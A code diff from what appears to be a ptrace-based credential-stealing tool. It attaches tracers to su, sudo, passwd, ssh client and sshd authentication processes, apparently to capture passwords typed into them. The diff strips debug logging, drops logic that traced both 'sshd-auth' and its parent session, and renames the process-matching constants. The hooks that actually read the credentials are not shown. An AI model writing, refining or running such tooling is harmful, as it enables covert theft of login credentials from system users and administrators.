@@ -24,25 +24,12 @@ void (*tracers[])(pid_t) = {NULL,
   intercept_su,
   intercept_ssh_client,
   intercept_passwd,
-  NULL
-  };
+  NULL};
 
 pid_t process_pid;
 char *process_name;
 char *process_path;
 char *process_username;
-
-pid_t get_ppid(pid_t pid) {
-    char stat_path[256];
-    snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);
-    FILE *f = fopen(stat_path, "r");
-    if (!f) return -1;
-
-    pid_t ppid = -1;
-    int res = fscanf(f, "%*d %*s %*c %d", &ppid);
-    fclose(f);
-    return (res == 1) ? ppid : -1;
-}
 
 
 long __get_reg(pid_t child, int off) {
@@ -167,10 +154,10 @@ enum tracer_types validate_process_name(void) {
   if (!process_name)
     return invalid_tracer;
 
-  if (ENABLE_SSH && strncmp(process_name, P_SSHD_SESSION, strlen(P_SSHD_SESSION)) == 0)
+  if (ENABLE_SSH && strncmp(process_name, P_SSH_NET, strlen(P_SSH_NET)) == 0)
     return ssh_tracer;
 
-  if (ENABLE_SSH && strncmp(process_name, P_SSHD_AUTH, strlen(P_SSHD_AUTH)) == 0)
+  if (ENABLE_SSH && strncmp(process_name, P_SSH_ACC, strlen(P_SSH_ACC)) == 0)
     return ssh_tracer;
 
   if (ENABLE_SUDO && strncmp(process_name, P_SUDO, strlen(P_SUDO)) == 0)
@@ -205,8 +192,7 @@ int validate_process_path(void) {
     if (strncmp(process_path, config_path, slen) == 0)
       return 1;
   }
-  //fprintf(stderr, "[DEBUG] Rejected process path: %s\n", process_path);
-  debug("[DEBUG] Rejected process path: %s\n", process_path);
+
   return 0;
 }
 
@@ -238,78 +224,26 @@ int strnascii(const char *string, size_t length) {
 }
 
 void trace_process(pid_t traced_process) {
-  //fprintf(stderr, "[DEBUG] trace_process() called on pid %d\n", traced_process);
-  debug("[DEBUG] trace_process() called on pid %d\n", traced_process);
   enum tracer_types type = invalid_tracer;
 
   process_name = get_proc_name(traced_process);
-  //fprintf(stderr, "[DEBUG] get_proc_name() returned: %s\n", process_name);
-  debug("[DEBUG] get_proc_name() returned %s\n", process_name);
   process_path = get_proc_path(traced_process);
   process_pid = traced_process;
 
-  if (!process_name) {
-    //fprintf(stderr, "[DEBUG] Failed to get process name\n"); 
-    debug("[DEBUG] Failed to get process name\n");
+  if (!process_name || !process_path)
     return;
-  }
 
-  if (!process_path) {
-    //fprintf(stderr, "[DEBUG] Failed to get process path\n");
-    debug("[DEBUG] Failed to get process path\n");
-    return;
-  }
-
-  //fprintf(stderr, "[DEBUG] process_name: %s\n", process_name);
-  debug("[DEBUG] process_name: %s\n", process_name);
-  //fprintf(stderr, "[DEBUG] process_path: %s\n", process_path);
-  debug("[DEBUG] process_path; %s\n", process_path);
   type = validate_process_name();
-  //fprintf(stderr, "[DEBUG] validate_process_name() returned: %d\n", type);
-  debug("[DEBUG] validate_process_name() returned: %d\n", type);
 
-  if (!type) {
-    //fprintf(stderr, "[DEBUG] Invalid tracer type (likely invalid process_name)\n");
-    debug("[DEBUG} Invalid tracer type (likely invalide process name\n"); 
-return;
-  }
-
-  //if (!process_name || !type || !process_path)
-  //  return;
-
-  if (!validate_process_path()) {
-    //fprintf(stderr, "[DEBUG] Invalid process path: %s\n", process_path);
-    debug("[DEBUG] Invalid process path: %s\n", process_path);
+  if (!process_name || !type || !process_path)
     return;
-  }
+
+  if (!validate_process_path())
+    return;
 
   process_username = get_proc_username(traced_process);
 
-if (type == ssh_tracer && strcmp(process_name, "sshd-auth") == 0) {
-    pid_t ppid = get_ppid(traced_process);
-    //fprintf(stderr, "[DEBUG] Tracing sshd-auth:%d and parent sshd-session:%d\n", traced_process, ppid);
-    debug("[DEBUG] Tracing sshd-auth:%d and parent sshd-session:%d\n", traced_process, ppid);
-    if (fork() == 0) {
-        intercept_ssh_auth(traced_process);
-        exit(0);
-    }
-
-    if (fork() == 0) {
-        intercept_ssh_session(ppid);
-        exit(0);
-    }
-
-    wait(NULL);
-    wait(NULL);
-    return;
-}
-
-  if (tracers[type] != NULL) {
-    //fprintf(stderr, "[DEBUG] Calling tracer for process type: %d\n", type);
-    debug("[DEBUG] Calling tracer for process type: %d\n", type);
+  if (tracers[type] != NULL)
     tracers[type](traced_process);
-  } else {
-    //fprintf(stderr, "[DEBUG] No tracer function available for type: %d\n", type);
-    debug("[DEBUG] No tracer function available for type: %d\n", type);
-  }
 }
+
